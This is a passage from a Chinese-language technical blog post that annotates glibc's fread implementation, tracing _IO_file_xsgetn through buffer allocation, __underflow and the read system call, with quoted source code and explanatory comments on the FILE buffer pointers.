n)</span><br></pre></td></tr></table></figure><p>实际上就是FILE结构体中vtable的<code>__xsgetn</code>函数，跟进去<code>/libio/fileops.c</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_file_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> want, have;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line">  <span class="type">char</span> *s = data;</span><br><span class="line"></span><br><span class="line">  want = n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;<span class="comment">// 第一部分，如果fp-&gt;_IO_buf_base为空的话则调用`_IO_doallocbuf`</span></span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>)<span class="comment">//!!!注意这个循环++++++</span></span><br><span class="line">    &#123;</span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)<span class="comment">// 第二部分，输入缓冲区里已经有足够的字符，则直接把缓冲区里的字符给目标buff</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">  fp-&gt;_IO_read_ptr += want;<span class="comment">//---从这一部分也可以看出,输入多余程序指定的内容,多余部分会被留在缓冲区中供下一次使用---</span></span><br><span class="line">  want = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)<span class="comment">// 第二部分，输入缓冲区里有部分字符，但是没有达到fread的size需求，先把已有的拷贝至目标buff</span></span><br><span class="line">    &#123;</span><br><span class="line">      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">      want -= have;</span><br><span class="line">      fp-&gt;_IO_read_ptr += have;<span class="comment">//那么_IO_read_ptr==_IO_read_end</span></span><br><span class="line">    &#125;</span><br><span class="line">          <span class="comment">//可能有人会有疑惑,读入后s没有变化,那么每次读入不都是读入到同一个地方,会覆盖之前的吗</span></span><br><span class="line">          <span class="comment">//见注1</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">     the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">     the user buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">      &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<span class="comment">//want小于buf承载极限</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (__underflow (fp) == EOF) <span class="comment">// 第三部分，输入缓冲区里不能满足需求，调用__underflow读入数据,当然这是在want&lt;buffer空间的情况下</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">continue</span>;<span class="comment">//返回ptr则continue</span></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">//循环真正的内容一般执行到这里就结束了</span></span><br><span class="line">        <span class="comment">//再往下的内容是buf分配失败情况下,直接调用sysread的代码</span></span><br><span class="line">---------------------------------------------------------------------------------</span><br><span class="line">  <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">     waiting for input. */</span></span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">  count = want;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">count -= want % block_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, s, count);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  s += count;</span><br><span class="line">  want -= count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n - want;<span class="comment">//返回读入的长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>IO_file_xsgetn</code>是处理<code>fread</code>读入数据的核心函数，分为三个部分：</p><ul><li>第一部分是<code>fp-&gt;_IO_buf_base</code>为空的情况，表明此时的FILE结构体中的指针未被初始化，输入缓冲区未建立，则调用<code>_IO_doallocbuf</code>去初始化指针，建立输入缓冲区。</li><li>第二部分是输入缓冲区里有输入，即<code>fp-&gt;_IO_read_ptr</code>小于<code>fp-&gt;_IO_read_end</code>，此时将缓冲区里的数据直接拷贝至目标buff。</li><li>第三部分是输入缓冲区里的数据为空或者是不能满足全部的需求，则调用<code>__underflow</code>调用系统调用读入数据。</li></ul><p>接下来对<code>_IO_file_xsgetn</code>这三部分进行跟进并分析。</p><p>注<strong>1:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __mempcpy mempcpy</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mempcpy(D, S, N) ((void *) ((char *) memcpy (D, S, N) + (N)))</span></span><br></pre></td></tr></table></figure><p><strong>因此<code>s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</code>语句会自动更新s的值</strong></p><h2 id="0x1-1"><a href="#0x1-1" class="headerlink" title="0x1"></a>0x1</h2><p><strong>初始化输入缓冲区</strong></p><p>在<code>fp-&gt;_IO_buf_base</code>为空时，也就是输入缓冲区未建立时，代码调用<code>_IO_doallocbuf</code>函数去建立输入缓冲区。跟进<code>_IO_doallocbuf</code>函数，看下它是如何初始化输入缓冲区，为输入缓冲区分配空间的，文件在<code>/libio/genops.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_doallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)<span class="comment">// 如何输入缓冲区不为空，直接返回</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; <span class="number">0</span>)<span class="comment">//检查标志位</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_DOALLOCATE (fp) != EOF)<span class="comment">//调用vtable函数</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数先检查<code>fp-&gt;_IO_buf_base</code>是否为空，如果不为空的话表明该输入缓冲区已被初始化，直接返回。如果为空，则检查<code>fp-&gt;_flags</code>看它是不是<code>_IO_UNBUFFERED</code>或者<code>fp-&gt;_mode</code>大于0，如果满足条件调用FILE的vtable中的<code>_IO_file_doallocate</code>，跟进去该函数，在<code>/libio/filedoalloc.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_doallocate (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> size;</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line">  size = BUFSIZ;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_fileno &gt;= <span class="number">0</span> &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), <span class="number">0</span>) &gt;= <span class="number">0</span>) <span class="comment">// 调用`_IO_SYSSTAT`获取FILE信息</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (S_ISCHR (st.st_mode))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Possibly a tty.  */</span></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEV_TTY_P</span></span><br><span class="line">      DEV_TTY_P (&amp;st) ||</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      local_isatty (fp-&gt;_fileno))</span><br><span class="line">    fp-&gt;_flags |= _IO_LINE_BUF;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _STATBUF_ST_BLKSIZE</span></span><br><span class="line">      <span class="keyword">if</span> (st.st_blksize &gt; <span class="number">0</span> &amp;&amp; st.st_blksize &lt; BUFSIZ)</span><br><span class="line">size = st.st_blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  p = <span class="built_in">malloc</span> (size);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (p == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  _IO_setb (fp, p, p + size, <span class="number">1</span>);<span class="comment">// 调用`_IO_setb`设置FILE缓冲区</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>_IO_file_doallocate</code>函数是分配输入缓冲区的实现函数，首先调用<code>_IO_SYSSTAT</code>去获取文件信息，<code>_IO_SYSSTAT</code>函数是vtable中的<code>__stat</code>函数，获取文件信息，<strong>修改相应需要申请的size。</strong></p><p>空间申请出来后，调用<code>_IO_setb</code>，跟进去看它干了些啥，文件在<code>/libio/genops.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数相对比较简单的就是设置了<code>_IO_buf_base</code>和<code>_IO_buf_end</code>，可以预料到<code>_IO_setb</code>函数执行完后，fp的这两个指针被赋上值了</p><p>到此，初始化缓冲区就完成了，函数返回<code>_IO_file_doallocate</code>后，接着<code>_IO_file_doallocate</code>也返回到<code>_IO_file_xsgetn</code>函数中.</p><h2 id="0x2-1"><a href="#0x2-1" class="headerlink" title="0x2"></a>0x2</h2><p><strong>拷贝输入缓冲区数据</strong></p><p>如果输入缓冲区里存在已输入的数据，则把它直接拷贝到目标缓冲区里。</p><p>这部分比较简单，<strong>需要说明下,<code>fp-&gt;_IO_read_base</code>指向的是输入缓冲区的起始地址，<code>fp-&gt;_IO_read_end</code>指向的是输入缓冲区的结束地址。<code>fp-&gt;_IO_read_ptr</code>指向还未读入的数据</strong></p><p>将<code>fp-&gt;_IO_read_end-fp-&gt;_IO_read_ptr</code>之间的数据通过<code>memcpy</code>拷贝到目标缓冲区里。</p><h2 id="0x3-1"><a href="#0x3-1" class="headerlink" title="0x3"></a>0x3</h2><p><strong>执行系统调用读取数据</strong></p><p>在输入缓冲区为0或者是不能满足需求的时候则会执行最后一步<code>__underflow</code>去执行系统调用<code>read</code>读取数据，并放入到输入缓冲区里。</p><p>进入到<code>__underflow</code>，文件在<code>/libio/genops.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">-1</span>) != <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line"><span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数稍微做一些检查就会调用<code>_IO_UNDERFLOW</code>函数，其中一个检查是如果<code>fp-&gt;_IO_read_ptr</code>小于<code>fp-&gt;_IO_read_end</code>则表明输入缓冲区里存在数据，可直接返回，否则则表示需要继续读入数据。</p><p>检查都通过的话就会调用<code>_IO_UNDERFLOW</code>函数，该函数是FILE结构体vtable里的<code>_IO_new_file_underflow</code>，跟进去看，文件在<code>/libio/fileops.c</code>里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment"> required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment"> traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment"> not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment"> explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">_IO_OVERFLOW (<span class="built_in">stdout</span>, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;<span class="comment">//重置诸多缓存指针</span></span><br><span class="line"><span class="comment">//为什么要重置write指针,因为read和write用的是同一个缓冲区,如果不重置wirte的指针的话,那么调用write显然就会冲突</span></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<span class="comment">//最多读buf大小</span></span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;<span class="comment">//read_end指针拔高,这样退出该函数再次进入上层循环时就能直接从read_ptr指针处获得数据</span></span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment"> handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment"> unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个<code>_IO_new_file_underflow</code>函数，是最终调用系统调用的地方，在最终执行系统调用之前，仍然有一些检查，整个流程为：</p><ol><li>检查FILE结构体的<code>_flag</code>标志位是否包含<code>_IO_NO_READS</code>，如果存在这个标志位则直接返回<code>EOF</code>，其中<code>_IO_NO_READS</code>标志位的定义是<code>#define _IO_NO_READS 4 /* Reading not allowed */</code>。</li><li>如果<code>fp-&gt;_IO_buf_base</code>位null，则调用<code>_IO_doallocbuf</code>分配输入缓冲区。</li><li>接着初始化设置FILE结构体指针，将他们都设置成<code>fp-&gt;_IO_buf_base</code></li><li>调用<code>_IO_SYSREAD</code>（vtable中的<code>_IO_file_read</code>函数），该函数最终执行系统调用read，读取文件数据，数据读入到<code>fp-&gt;_IO_buf_base</code>中，读入大小为输入缓冲区的大小<code>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code>。</li><li>设置输入缓冲区已有数据的size，即设置<code>fp-&gt;_IO_read_end</code>为<code>fp-&gt;_IO_read_end += count</code>。</li></ol><p>其中第二步里面的如果<code>fp-&gt;_IO_buf_base</code>位null，则调用<code>_IO_doallocbuf</code>分配输入缓冲区，似乎有点累赘，因为之前已经分配了，这个原因在最后会说明。</p><p>其中第四步的<code>_IO_SYSREAD</code>（vtable中的<code>_IO_file_read</code>函数）的源码比较简单，就是执行系统调用函数read去读取文件数据，文件在<code>libio/fileops.c</code>，源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span></span><br><span class="line">_IO_file_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (__builtin_expect (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL, <span class="number">0</span>)</span><br><span class="line">  ? __read_nocancel (fp-&gt;_fileno, buf, size)</span><br><span class="line">  : __read (fp-&gt;_fileno, buf, size));</span><br><span 